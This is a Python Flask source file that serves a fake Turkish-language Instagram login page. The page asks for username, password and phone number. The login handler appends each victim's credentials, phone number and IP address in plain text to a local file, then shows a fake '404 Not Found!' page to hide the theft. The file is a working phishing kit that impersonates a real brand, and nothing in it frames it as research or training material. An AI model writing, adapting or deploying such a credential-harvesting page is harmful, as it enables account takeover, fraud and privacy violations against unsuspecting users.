from flask import Flask, request, render_template_string
import socket

app = Flask(__name__)

HOME_PAGE = '''
<!DOCTYPE html>
<html>
    <head>
        <title>Instagram - Giriş Yap</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #fafafa;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-container {
                width: 300px;
                padding: 20px;
                background-color: #fff;
                border: 1px solid #ddd;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                text-align: center;
            }
            input[type="text"], input[type="password"], input[type="tel"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 4px;
            }
            button {
                width: 100%;
                padding: 10px;
                background-color: #3897f0;
                color: #fff;
                border: none;
                border-radius: 4px;
                font-weight: bold;
                cursor: pointer;
            }
            button:hover {
                background-color: #2874c4;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Instagram</h2>
            <form action="/login" method="POST">
                <input type="text" name="username" placeholder="Kullanıcı Adı" required>
                <input type="password" name="password" placeholder="Şifre" required>
                <input type="tel" name="phone" placeholder="Telefon Numarası" required>
                <button type="submit">Giriş Yap</button>
            </form>
        </div>
    </body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HOME_PAGE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    phone = request.form.get('phone')
    ip_address = request.remote_addr
    hostname = socket.gethostname()
    with open('info.txt', 'a') as file:
        file.write(f'Kullanıcı Adı: {username}, Şifre: {password}, Telefon: {phone}, IP: {ip_address}, Hostname: {hostname}\n')
    return '404 Not Found!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)